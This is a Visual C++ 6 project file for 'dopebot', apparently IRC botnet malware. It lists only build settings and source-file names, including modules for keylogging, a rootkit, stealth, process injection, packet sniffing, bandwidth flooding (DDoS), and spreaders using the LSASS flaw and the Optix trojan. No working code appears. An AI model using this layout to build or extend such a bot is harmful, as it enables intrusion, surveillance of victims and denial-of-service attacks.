# Microsoft Developer Studio Project File - Name="dopebot" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=dopebot - Win32 Release
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "dopebot.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "dopebot.mak" CFG="dopebot - Win32 Release"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "dopebot - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE "dopebot - Win32 Debug" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "dopebot - Win32 Release"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "BIN32"
# PROP BASE Intermediate_Dir "Temp/Bot"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "BIN32"
# PROP Intermediate_Dir "Temp/Bot"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x41d /d "NDEBUG"
# ADD RSC /l 0x41d /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 /nologo /subsystem:windows /machine:I386
# ADD LINK32 /nologo /subsystem:windows /machine:I386 /out:"BIN32/dopebot.exe"

!ELSEIF  "$(CFG)" == "dopebot - Win32 Debug"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "BIN32"
# PROP BASE Intermediate_Dir "Temp/Bot"
# PROP BASE Ignore_Export_Lib 0
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "BIN32"
# PROP Intermediate_Dir "Temp/Bot"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_CONSOLE" /D "_MBCS" /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x41d /d "NDEBUG"
# ADD RSC /l 0x41d /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 /nologo /subsystem:windows /machine:I386
# ADD LINK32 /nologo /subsystem:console /machine:I386 /out:"BIN32/dopebot_debug.exe"
# SUBTRACT LINK32 /pdb:none

!ENDIF 

# Begin Target

# Name "dopebot - Win32 Release"
# Name "dopebot - Win32 Debug"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Group "Bot Source"

# PROP Default_Filter ""
# Begin Group "Protocol Source"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Bot\Protocol\irc.cpp
# End Source File
# End Group
# Begin Source File

SOURCE=.\Bot\bot.cpp
# End Source File
# Begin Source File

SOURCE=.\Bot\crypto.cpp
# End Source File
# Begin Source File

SOURCE=.\Bot\download.cpp
# End Source File
# Begin Source File

SOURCE=.\Bot\file.cpp
# End Source File
# Begin Source File

SOURCE=.\Bot\fwb.cpp
# End Source File
# Begin Source File

SOURCE=.\Bot\injection.cpp
# End Source File
# Begin Source File

SOURCE=.\Bot\install.cpp
# End Source File
# Begin Source File

SOURCE=.\Bot\keylogger.cpp
# End Source File
# Begin Source File

SOURCE=.\Bot\melt.cpp
# End Source File
# Begin Source File

SOURCE=.\Bot\misc.cpp
# End Source File
# Begin Source File

SOURCE=.\Bot\netinfo.cpp
# End Source File
# Begin Source File

SOURCE=.\Bot\process.cpp
# End Source File
# Begin Source File

SOURCE=.\Bot\registry.cpp
# End Source File
# Begin Source File

SOURCE=.\Bot\rootkit.cpp
# End Source File
# Begin Source File

SOURCE=.\Bot\scanner.cpp
# End Source File
# Begin Source File

SOURCE=.\Bot\secure.cpp
# End Source File
# Begin Source File

SOURCE=.\Bot\service.cpp
# End Source File
# Begin Source File

SOURCE=.\Bot\sfc.cpp
# End Source File
# Begin Source File

SOURCE=.\Bot\sniffer.cpp
# End Source File
# Begin Source File

SOURCE=.\Bot\stealth.cpp
# End Source File
# Begin Source File

SOURCE=.\Bot\sysinfo.cpp
# End Source File
# Begin Source File

SOURCE=.\Bot\transfer.cpp
# End Source File
# Begin Source File

SOURCE=.\Bot\unhook.cpp
# End Source File
# End Group
# Begin Group "Daemon Source"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Daemons\ftpd.cpp
# End Source File
# Begin Source File

SOURCE=.\Daemons\identd.cpp
# End Source File
# Begin Source File

SOURCE=.\Daemons\tftpd.cpp
# End Source File
# End Group
# Begin Group "DDOS Source"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\DDOS\bandwithflood.cpp
# End Source File
# End Group
# Begin Group "Spreader Source"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Spreaders\lsasspreader.cpp
# End Source File
# Begin Source File

SOURCE=.\Spreaders\optixspreader.cpp
# End Source File
# End Group
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Group "Bot Headers"

# PROP Default_Filter ""
# Begin Group "Protocol Headers"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Bot\Protocol\irc.h
# End Source File
# End Group
# Begin Source File

SOURCE=.\Bot\bot.h
# End Source File
# Begin Source File

SOURCE=.\Bot\crypto.h
# End Source File
# Begin Source File

SOURCE=.\Bot\download.h
# End Source File
# Begin Source File

SOURCE=.\Bot\file.h
# End Source File
# Begin Source File

SOURCE=.\Bot\fwb.h
# End Source File
# Begin Source File

SOURCE=.\Bot\injection.h
# End Source File
# Begin Source File

SOURCE=.\Bot\install.h
# End Source File
# Begin Source File

SOURCE=.\Bot\keylogger.h
# End Source File
# Begin Source File

SOURCE=.\Bot\melt.h
# End Source File
# Begin Source File

SOURCE=.\Bot\misc.h
# End Source File
# Begin Source File

SOURCE=.\Bot\netinfo.h
# End Source File
# Begin Source File

SOURCE=.\Bot\process.h
# End Source File
# Begin Source File

SOURCE=.\Bot\registry.h
# End Source File
# Begin Source File

SOURCE=.\Bot\rootkit.h
# End Source File
# Begin Source File

SOURCE=.\Bot\scanner.h
# End Source File
# Begin Source File

SOURCE=.\Bot\secure.h
# End Source File
# Begin Source File

SOURCE=.\Bot\service.h
# End Source File
# Begin Source File

SOURCE=.\Bot\sfc.h
# End Source File
# Begin Source File

SOURCE=.\Bot\sniffer.h
# End Source File
# Begin Source File

SOURCE=.\Bot\stealth.h
# End Source File
# Begin Source File

SOURCE=.\Bot\sysinfo.h
# End Source File
# Begin Source File

SOURCE=.\Bot\tcpip.h
# End Source File
# Begin Source File

SOURCE=.\Bot\transfer.h
# End Source File
# Begin Source File

SOURCE=.\Bot\unhook.h
# End Source File
# End Group
# Begin Group "Daemon Headers"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Daemons\ftpd.h
# End Source File
# Begin Source File

SOURCE=.\Daemons\identd.h
# End Source File
# Begin Source File

SOURCE=.\Daemons\tftpd.h
# End Source File
# End Group
# Begin Group "DDOS Headers"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\DDOS\bandwithflood.h
# End Source File
# End Group
# Begin Group "Spreader Headers"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Spreaders\lsasspreader.h
# End Source File
# Begin Source File

SOURCE=.\Spreaders\optixspreader.h
# End Source File
# End Group
# Begin Group "Settings"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Settings\config.h
# End Source File
# Begin Source File

SOURCE=.\Settings\defines.h
# End Source File
# Begin Source File

SOURCE=.\Settings\externs.h
# End Source File
# End Group
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# Begin Source File

SOURCE=.\Resources\Files\driver.sys
# End Source File
# Begin Source File

SOURCE=.\Resources\Files\hook.dll
# End Source File
# Begin Source File

SOURCE=.\Resources\res.rc
# End Source File
# End Group
# Begin Group "Documents"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Documents\bugs.txt
# End Source File
# Begin Source File

SOURCE=.\Documents\changes.txt
# End Source File
# Begin Source File

SOURCE=.\Documents\commands.txt
# End Source File
# Begin Source File

SOURCE=.\Documents\todo.txt
# End Source File
# End Group
# End Target
# End Project
